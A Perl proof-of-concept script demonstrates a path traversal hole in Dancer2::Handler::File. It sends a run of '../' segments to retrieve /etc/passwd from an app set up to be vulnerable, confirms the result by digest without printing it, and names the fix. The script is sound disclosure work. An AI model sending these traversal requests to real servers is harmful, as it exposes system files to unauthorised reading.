#!/usr/bin/env perl

# Demonstration of finding F4: Dancer2::Handler::File joins public_dir with the
# request path and never checks that the result is still inside public_dir, so
# a request path made of ../ segments escapes and is served with a 200.
#
# Run it from the root of a Dancer2 checkout:
#
#     perl -Ilib paad/test-roadmap/f4-traversal-demo.pl
#
# or against an installed Dancer2:
#
#     perl paad/test-roadmap/f4-traversal-demo.pl
#
# NOTHING FROM /etc/passwd IS PRINTED. Proving the file was read does not
# require showing it: this script reads /etc/passwd directly (as the same user
# the server runs as, which is allowed) and compares a SHA-256 digest of those
# bytes against a digest of what the web request returned. Equal digests mean
# the request served that exact file. The digest of a whole file is not
# reversible, so the output is safe on a shared screen or in a bug report.
#
# Everything runs in-process through Plack::Test. No port is opened and no
# browser is involved, so there is no window in which a real HTTP client could
# render the file to a screen.

use strict;
use warnings;

use Digest::SHA  qw( sha256_hex );    # core since 5.10
use Path::Tiny   ();
use Plack::Test;
use HTTP::Request;

my ( $ROOT, $PUBLIC, $VULN_CONF, $SAFE_CONF );

BEGIN {
    $ROOT   = Path::Tiny->tempdir;
    $PUBLIC = $ROOT->child('public');
    $PUBLIC->mkpath;

    # An ordinary file that is legitimately inside public_dir.
    $PUBLIC->child('hello.txt')->spew_utf8('HELLO-FROM-PUBLIC-DIR');

    # A harmless canary one level ABOVE public_dir. Its content is safe to
    # print, so it shows the escape itself in plain sight without needing a
    # real system file to make the point.
    $ROOT->child('canary.txt')
        ->spew_utf8('CANARY-OUTSIDE-PUBLIC-DIR');

    # The vulnerable configuration. Both settings are required:
    # route_handlers enables Dancer2::Handler::File, and static_handler: 0
    # turns off the default Plack::App::File middleware that would otherwise
    # refuse these requests first. route_handlers is read once, when the
    # application object is built at import time, so this has to be a config
    # file on disk rather than a later 'set'.
    $VULN_CONF = $ROOT->child('conf-vulnerable');
    $VULN_CONF->mkpath;
    $VULN_CONF->child('config.yml')->spew_utf8( <<"YML" );
logger: "null"
public_dir: "$PUBLIC"
static_handler: 0
route_handlers:
  - - File
    - public_dir: "$PUBLIC"
YML

    # The default configuration, for contrast: static handler on, no File
    # route handler.
    $SAFE_CONF = $ROOT->child('conf-default');
    $SAFE_CONF->mkpath;
    $SAFE_CONF->child('config.yml')->spew_utf8( <<"YML" );
logger: "null"
public_dir: "$PUBLIC"
static_handler: 1
YML
}

# Each application reads its config when it is built at import time, so the
# environment variable is switched between the two compile-time 'use' lines.
BEGIN { $ENV{DANCER_CONFDIR} = "$VULN_CONF" }
{ package VulnerableApp; use Dancer2; }

BEGIN { $ENV{DANCER_CONFDIR} = "$SAFE_CONF" }
{ package DefaultApp;    use Dancer2; }

my $vulnerable = Plack::Test->create( VulnerableApp->to_app );
my $default    = Plack::Test->create( DefaultApp->to_app );

sub get_from {
    my ( $client, $path ) = @_;
    # HTTP::Request directly, not GET(): ../ must survive to PATH_INFO rather
    # than being normalised away by a URI-building helper.
    return $client->request( HTTP::Request->new( GET => $path ) );
}

# Enough ../ to climb out of any temporary directory. Surplus segments
# collapse harmlessly at the filesystem root, so no guess about depth is
# needed.
my $ESCAPE = '/' . ( '../' x 20 );

print "Dancer2 F4 - path traversal in Dancer2::Handler::File\n";
# In a source checkout the version is undef: dist.ini holds it and
# Dist::Zilla injects it at build time. Say so rather than printing nothing.
printf "Dancer2 version: %s\n",
    defined $Dancer2::VERSION
    ? $Dancer2::VERSION
    : '(source checkout - version is injected at build time)';
printf "Loaded from:     %s\n", $INC{'Dancer2.pm'} // '(unknown)';
print "public_dir:      $PUBLIC\n\n";

print "1. A normal file inside public_dir (control - this should work)\n";
my $ok = get_from( $vulnerable, '/hello.txt' );
printf "   GET /hello.txt -> %s %s\n\n", $ok->code, $ok->content;

print "2. A file one level ABOVE public_dir, which should not be reachable\n";
my $canary = get_from( $vulnerable, '/../canary.txt' );
printf "   GET /../canary.txt -> %s %s\n", $canary->code, $canary->content;
print "   (safe to print: this script created that file for the demo)\n\n";

print "3. A real system file, /etc/passwd\n";
my $verdict = 'INCONCLUSIVE';
if ( !-r '/etc/passwd' ) {
    print "   skipped: no readable /etc/passwd on this platform\n\n";
}
else {
    my $res = get_from( $vulnerable, $ESCAPE . 'etc/passwd' );

    # The comparison, done here rather than on screen.
    my $served = $res->content;
    my $actual = Path::Tiny::path('/etc/passwd')->slurp_raw;

    printf "   GET %setc/passwd -> %s\n", $ESCAPE, $res->code;
    printf "   bytes served:        %d\n", length $served;
    printf "   bytes in /etc/passwd: %d\n", length $actual;
    printf "   sha256 served:       %s\n", sha256_hex($served);
    printf "   sha256 /etc/passwd:  %s\n", sha256_hex($actual);

    if ( $res->code == 200 && length($served) && $served eq $actual ) {
        $verdict = 'VULNERABLE';
        print "\n   MATCH - the response was byte-for-byte /etc/passwd.\n";
        print "   The file was read and served. Its contents are not shown.\n\n";
    }
    else {
        $verdict = 'NOT REPRODUCED';
        print "\n   No match - the request did not return /etc/passwd.\n";
        print "   If this checkout has the containment fix, that is expected.\n\n";
    }
}

print "4. The same request against a DEFAULT configuration, for contrast\n";
my $blocked = get_from( $default, $ESCAPE . 'etc/passwd' );
printf "   GET %setc/passwd -> %s\n", $ESCAPE, $blocked->code;
print "   Refused by Plack::App::File before Dancer2 sees it.\n";
print "   This is why the hole needs static_handler: 0 to reach.\n\n";

print "-" x 68, "\n";
print "Verdict: $verdict\n";
print <<'SUMMARY';

Affected only when an application both enables Dancer2::Handler::File and
sets static_handler: 0. A default Dancer2 application is not exposed.

The missing check is the one send_file already makes, in
lib/Dancer2/Core/App.pm:

    $dir->realpath->subsumes($file_path)

Applying it in lib/Dancer2/Handler/File.pm, in place of the unreachable
403 guard on the result of Path::Tiny::stringify, makes step 3 above
return 403 instead of 200.
SUMMARY
